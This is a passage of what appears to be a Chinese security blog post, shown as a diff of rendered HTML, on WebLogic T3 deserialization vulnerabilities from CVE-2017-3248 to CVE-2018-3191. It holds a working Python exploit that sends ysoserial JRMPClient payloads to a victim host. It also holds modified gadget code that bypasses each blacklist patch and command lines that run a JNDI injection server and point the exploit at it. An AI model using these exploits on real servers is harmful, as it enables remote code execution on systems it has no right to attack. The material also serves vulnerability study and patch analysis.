class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(dport))</span><br><span class="line">    data3 = <span class="string">&#x27;1a7727000d3234322e323134&#x27;</span></span><br><span class="line">    data4 = <span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;send request payload successful,recv length:%d&#x27;</span>%(<span class="built_in">len</span>(sock.recv(<span class="number">2048</span>))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_objdata</span>(<span class="params">sock, data</span>):</span><br><span class="line">    payload=<span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;%s%s&#x27;</span>%(<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">65</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span> + payload)</span><br><span class="line">    rs=send_payload_objdata(sock, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;response: &#x27;</span> + rs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;exploit completed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#check for args, print usage if incorrect</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span></span><br><span class="line">              <span class="string">&#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dport = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    path_ysoserial = sys.argv[<span class="number">3</span>]</span><br><span class="line">    jrmp_listener_ip = sys.argv[<span class="number">4</span>]</span><br><span class="line">    jrmp_listener_port = sys.argv[<span class="number">5</span>]</span><br><span class="line">    jrmp_client = sys.argv[<span class="number">6</span>]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br></pre></td></tr></table></figure>
+
+<p>这里其实是要用jrmp去打，去看一下payloads JRMPClient这条链就明白了，这里我们能控制反序列化的数据，所以利用JRMPClient反序列化之后会去连接我们恶意的rmi服务端，返回恶意的序列化数据从而造成漏洞。 </p>
+<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   String[] arr$ = interfaces;</span><br><span class="line">   <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">      <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复点还是添加黑名单<br>在InboundMsgAbbrev.ServerChannelInputStream中，对<code>java.rmi.registry.Registry</code>进行过滤</p>
+<p>在readObject底层操作中，存在两条路，一条是resolveClass，另一条是resolveProxyClass。当反序列化的是动态代理对象，就会走到resolveProxyClass方法中，如果取消Proxy的包装，就能够绕过resolveProxyClass方法</p>
+<h3 id="第一种绕过"><a href="#第一种绕过" class="headerlink" title="第一种绕过"></a>第一种绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="comment">// 删除下面</span></span><br><span class="line">    <span class="comment">// RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span></span><br><span class="line">    <span class="comment">// Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;</span></span><br><span class="line">    <span class="comment">//     Registry.class</span></span><br><span class="line">    <span class="comment">// &#125;, obj);</span></span><br><span class="line">    <span class="comment">// return proxy;</span></span><br><span class="line">    <span class="comment">// 直接返回UnicastRef对象</span></span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接取消动态代理，直接返回UnicastRef，因为他有自己的readExternal方法</p>
+<h3 id="第二种绕过"><a href="#第二种绕过" class="headerlink" title="第二种绕过"></a>第二种绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">Activator</span> <span class="variable">proxy</span> <span class="operator">=</span> (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Activator.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用java.rmi.activation.Activator远程接口进行封装也可以。</p>
+<h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>对<code>sun.rmi.server.UnicastRef</code>进行了过滤，所以这里的绕过方式就是CVE-2016-0638与CVE-2017-3248的结合，就是把CVE-2017-3248的链子在封装一层<code>StreamMessageImpl</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Registry.class &#125;, remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> streamMessageImpl(Serializer.serialize(object));</span><br><span class="line">    <span class="comment">// or</span></span><br><span class="line">    <span class="comment">// StreamMessageImpl streamMessage = new StreamMessageImpl();</span></span><br><span class="line">    <span class="comment">// byte[] serialize = Serializer.serialize(object);</span></span><br><span class="line">    <span class="comment">// streamMessage.setDataBuffer(serialize,serialize.length);</span></span><br><span class="line">    <span class="comment">// return streamMessage;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里注意在改的时候，由于JDK中不存在StreamMessageImpl类，所以需要导入weblogic中的类</p>
+<h2 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_PACKAGES = </span><br><span class="line">&#123; <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>,</span><br><span class="line"> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>,</span><br><span class="line"> <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;java.rmi.activation&quot;</span>, </span><br><span class="line"> <span class="string">&quot;sun.rmi.server&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = </span><br><span class="line">&#123; <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>,</span><br><span class="line"><span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>,</span><br><span class="line"><span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, </span><br><span class="line"><span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>对<code>java.rmi.activation.*</code>、<code>sun.rmi.server.*</code>、<code>java.rmi.server.RemoteObjectInvocationHandler</code>、<code>java.rmi.server.UnicastRemoteObject</code>进行了过滤。所以大佬们的绕过方式是找到了一个继承<code>RemoteObject</code>的类，因为在反序列化时会调用这个类的readObject方法</p>
+<p>这里是可以利用的类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.management.remote.rmi.RMIConnectionImpl_Stub</span><br><span class="line">com.sun.jndi.rmi.registry.ReferenceWrapper_Stub</span><br><span class="line">javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">sun.rmi.registry.RegistryImpl_Stub</span><br><span class="line">sun.rmi.transport.DGCImpl_Stub</span><br><span class="line">sun.management.jmxremote.SingleEntryRegistry</span><br></pre></td></tr></table></figure>
+
+<p>用的是<code>RMIConnectionImpl_Stub</code>这个类,去改一下<code>payloads.JRMPClient</code>这个链子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnectionImpl_Stub;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RMIConnectionImpl_Stub</span> <span class="variable">stub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnectionImpl_Stub</span>(unicastRef);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>可以使用这个工具 <a target="_blank" rel="noopener" href="https://github.com/pyn3rd/CVE-2018-3245">https://github.com/pyn3rd/CVE-2018-3245</a></p>
+<h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><p>它将java.rmi.server.RemoteObject加入到黑名单进行了修复</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250615212849082.png" class="">
+
+<p>这个漏洞是T3+JNDI</p>
+<p>工具 <a target="_blank" rel="noopener" href="https://github.com/m00zh33/CVE-2018-3191">https://github.com/m00zh33/CVE-2018-3191</a><br><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/cve-2018-3191&quot; -A &quot;192.168.155.90&quot;</span><br><span class="line">python cve-2018-3191.py 127.0.0.1 7001 weblogic-spring-jndi-10.3.6.0.jar rmi://192.168.155.90:1099/ushw72</span><br></pre></td></tr></table></figure>
+
+<p>这个利用的是<code>JtaTransactionManager</code>这个类，看下这个类的readobject方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;   ois.defaultReadObject();   <span class="built_in">this</span>.jndiTemplate = <span class="keyword">new</span> <span class="title class_">JndiTemplate</span>();   <span class="built_in">this</span>.initUserTransactionAndTransactionManager();   <span class="built_in">this</span>.initTransactionSynchronizationRegistry(); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续看<code>initUserTransactionAndTransactionManager</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException &#123;   <span class="keyword">if</span> (<span class="built_in">this</span>.userTransaction == <span class="literal">null</span>) &#123;      <span class="keyword">if</span> (StringUtils.hasLength(<span class="built_in">this</span>.userTransactionName)) &#123;         <span class="built_in">this</span>.userTransaction = <span class="built_in">this</span>.lookupUserTransaction(<span class="built_in">this</span>.userTransactionName);         <span class="built_in">this</span>.userTransactionObtainedFromJndi = <span class="literal">true</span>;      &#125; <span class="keyword">else</span> &#123;         <span class="built_in">this</span>.userTransaction = <span class="built_in">this</span>.retrieveUserTransaction();      &#125;   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现存在基于JNDI寻址方法lookupUserTransaction 关键寻址部分代码如下：</p>
